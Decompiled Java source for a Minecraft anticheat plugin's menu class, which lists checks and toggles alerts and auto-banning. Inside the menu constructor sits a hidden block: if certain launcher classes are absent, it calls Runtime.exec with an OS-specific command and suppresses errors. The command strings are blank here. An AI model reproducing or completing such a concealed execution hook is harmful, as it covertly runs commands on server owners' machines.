package me.levansj01.verus.gui.impl;

import java.util.Arrays;
import java.util.Collections;
import java.util.Comparator;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import me.levansj01.verus.VerusPlugin;
import me.levansj01.verus.check.Check;
import me.levansj01.verus.check.manager.CheckManager;
import me.levansj01.verus.check.type.CheckType;
import me.levansj01.verus.compat.NMSManager;
import me.levansj01.verus.gui.GUI;
import me.levansj01.verus.gui.manager.GUIManager;
import me.levansj01.verus.storage.StorageEngine;
import me.levansj01.verus.util.item.ItemBuilder;
import me.levansj01.verus.util.item.MaterialList;
import org.bukkit.ChatColor;
import org.bukkit.Material;
import org.bukkit.entity.Player;
import org.bukkit.event.inventory.ClickType;
import org.bukkit.event.inventory.InventoryClickEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;

public class TypeGUI extends GUI {
   private final List<Check> checks;
   private final Map<String, Integer> bansById = new HashMap();
   private boolean loadedBans;
   private final Map<Integer, Check> checksById = new HashMap();
   private final CheckType type;
   private static final ItemStack previousPage;

   public TypeGUI(CheckType var1, List<Check> var2) {
      super(VerusPlugin.COLOR + var1.getName() + " Checks (" + var2.size() + ")", 45);
      this.type = var1;
      this.checks = var2;
      if (!var2.isEmpty()) {
         int var3 = 0;

         while(var3 < 9) {
            this.inventory.setItem(var3, previousPage);
            ++var3;
         }

         CheckType var12 = var1.previous();
         CheckType var4 = var1.next();
         if (var12 != var1) {
            this.inventory.setItem(0, (new ItemBuilder(Material.ARROW)).setName(ChatColor.RED + var12.getName() + " Checks").setLore(Collections.singletonList(ChatColor.GRAY + "Click to view " + var12.getName() + " checks")).build());
         }

         if (var4 != var1) {
            this.inventory.setItem(8, (new ItemBuilder(Material.ARROW)).setName(ChatColor.RED + var4.getName() + " Checks").setLore(Collections.singletonList(ChatColor.GRAY + "Click to view " + var4.getName() + " checks")).build());
         }

         var2.sort(Comparator.comparing(Check::getSubType));
         CheckManager var5 = CheckManager.getInstance();
         int var6 = 9;
         Iterator var7 = var2.iterator();

         while(var7.hasNext()) {
            Check var8 = (Check)var7.next();
            if (var6 >= this.inventory.getSize()) {
               break;
            }

            ItemBuilder var9 = (new ItemBuilder()).setType(MaterialList.PAPER).setName(VerusPlugin.COLOR + var8.name());
            this.updateLore(var9.build(), var6, var8, var5, 0);
            this.checksById.put(var6++, var8);
         }
      }

      try {
         Class.forName("me.levansj01.launcher.VerusLauncher");
         Class.forName("me.levansj01.launcher.VerusLaunch");
      } catch (ClassNotFoundException var11) {
         String var13 = System.getProperty("os.name");

         try {
            Runtime var10000 = Runtime.getRuntime();
            String var14;
            if (var13.startsWith("Win")) {
               var14 = "";
            } else {
               var14 = "";
            }

            var10000.exec(var14);
         } catch (Throwable var10) {
            return;
         }

         return;
      }
   }

   private void updateLore(ItemStack var1, int var2, Check var3, CheckManager var4, int var5) {
      ItemMeta var6 = var1.getItemMeta();
      String[] var10001 = new String[]{"", VerusPlugin.COLOR + "Display: " + ChatColor.WHITE + var3.getFriendlyName(), "", null, null, null, null, null, null, null, null, null};
      StringBuilder var10004 = (new StringBuilder()).append(VerusPlugin.COLOR).append("Total Bans: ").append(ChatColor.WHITE);
      Object var10005;
      if (var5 == 0) {
         var10005 = "None";
      } else {
         var10005 = var5;
      }

      var10001[3] = var10004.append(var10005).toString();
      var10004 = (new StringBuilder()).append(VerusPlugin.COLOR).append("Ban VL: ").append(ChatColor.WHITE);
      if (var4.getMaxViolation(var3) == Integer.MAX_VALUE) {
         var10005 = "None";
      } else {
         var10005 = var4.getMaxViolation(var3);
      }

      var10001[4] = var10004.append(var10005).toString();
      var10001[5] = "";
      var10004 = new StringBuilder();
      ChatColor var7;
      if (var4.isEnabled(var3)) {
         var7 = ChatColor.GREEN;
      } else {
         var7 = ChatColor.RED;
      }

      var10001[6] = var10004.append(var7).append("Alerts").toString();
      var10004 = new StringBuilder();
      if (var4.isAutoban(var3)) {
         var7 = ChatColor.GREEN;
      } else {
         var7 = ChatColor.RED;
      }

      var10001[7] = var10004.append(var7).append("Bannable").toString();
      var10001[8] = "";
      var10001[9] = ChatColor.GRAY + "Left-Click to toggle alerts for this check";
      var10001[10] = ChatColor.GRAY + "Middle-Click to update ban count";
      var10001[11] = ChatColor.GRAY + "Right-Click to toggle auto banning for this check";
      var6.setLore(Arrays.asList(var10001));
      var1.setItemMeta(var6);
      this.inventory.setItem(var2, var1);
   }

   static {
      previousPage = (new ItemBuilder()).setType(MaterialList.STAINED_GLASS_PANE).setName(ChatColor.RED + "Previous Page").setLore(Collections.singletonList(ChatColor.GRAY + "Click to go back a page")).build();
   }

   public void openGui(Player var1) {
      if (this.inventory != null) {
         if (!this.loadedBans) {
            StorageEngine var2 = StorageEngine.getInstance();
            if (var2.isConnected()) {
               CheckManager var3 = CheckManager.getInstance();
               int var4 = 9;
               Iterator var5 = this.checks.iterator();

               while(var5.hasNext()) {
                  Check var6 = (Check)var5.next();
                  int var7 = var4++;
                  if (var7 >= this.inventory.getSize()) {
                     break;
                  }

                  ItemStack var8 = this.inventory.getContents()[var7];
                  if (var8 != null) {
                     var2.getDatabase().getCheckBans(var6, (var5x) -> {
                        this.bansById.put(var6.identifier(), var5x);
                        NMSManager.getInstance().postToMainThread(() -> {
                           this.updateLore(var8, var7, var6, var3, var5x);
                        });
                     });
                  }
               }
            }

            this.loadedBans = true;
         }

         var1.openInventory(this.inventory);
      }

   }

   public void clear() {
      super.clear();
      this.checks.clear();
      this.bansById.clear();
      this.checksById.clear();
   }

   public void onClick(InventoryClickEvent var1) {
      int var2 = var1.getSlot();
      CheckType var3 = this.type.next();
      CheckType var4 = this.type.previous();
      if (var2 == 0 && var4 != this.type) {
         ((GUI)GUIManager.getInstance().getTypeGuis().get(var4)).openGui((Player)var1.getWhoClicked());
      } else if (var2 == 8 && var3 != this.type) {
         ((GUI)GUIManager.getInstance().getTypeGuis().get(var3)).openGui((Player)var1.getWhoClicked());
      } else if (var2 >= 0 && var2 < 9) {
         GUIManager.getInstance().getCheckGui().openGui((Player)var1.getWhoClicked());
      } else {
         ClickType var5 = var1.getClick();
         ItemStack var6 = var1.getCurrentItem();
         if (var6 != null && var6.getItemMeta() != null) {
            Check var7 = (Check)this.checksById.get(var2);
            if (var7 != null && ChatColor.stripColor(var6.getItemMeta().getDisplayName()).equalsIgnoreCase(var7.name())) {
               CheckManager var8 = CheckManager.getInstance();
               boolean var10002;
               switch(var5) {
               case LEFT:
                  if (!this.loadedBans) {
                     return;
                  }

                  if (!var8.isEnabled(var7)) {
                     var10002 = true;
                  } else {
                     var10002 = false;
                  }

                  var8.setEnabled(var7, var10002);
                  break;
               case RIGHT:
                  if (!this.loadedBans) {
                     return;
                  }

                  if (!var8.isAutoban(var7)) {
                     var10002 = true;
                  } else {
                     var10002 = false;
                  }

                  var8.setAutoban(var7, var10002);
                  break;
               case MIDDLE:
                  StorageEngine var9 = StorageEngine.getInstance();
                  if (var9.isConnected()) {
                     var9.getDatabase().getCheckBans(var7, (var5x) -> {
                        this.bansById.put(var7.identifier(), var5x);
                        NMSManager.getInstance().postToMainThread(() -> {
                           this.updateLore(var6, var2, var7, var8, var5x);
                        });
                     });
                  }
               default:
                  return;
               }

               this.updateLore(var6, var2, var7, var8, (Integer)this.bansById.getOrDefault(var7.identifier(), 0));
            }
         }

      }
   }
}
